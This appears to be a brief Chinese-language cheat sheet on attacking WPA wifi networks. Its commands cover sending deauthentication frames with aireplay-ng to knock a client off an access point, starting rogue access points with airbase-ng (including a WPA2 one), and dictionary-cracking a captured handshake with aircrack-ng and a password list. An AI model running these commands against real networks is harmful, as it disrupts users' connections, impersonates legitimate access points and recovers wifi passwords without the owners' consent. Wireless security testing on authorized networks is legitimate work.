
# wpa攻击

* wpa攻击

## wpa攻击

> aireplay-ng -0 2 -a ap的mac -c ap相连的mac wlan0mon

* psk攻击
```shell
    开启名为leon的ap
    airbase-ng --essid leon -c 11 wlan0mon
    -z 加密 4 -> wpa2
    airbase-ng --essid kifi -c 11 -z 4 wlan0mon
    		
	aircrack-ng -w pass.txt test.cap
```

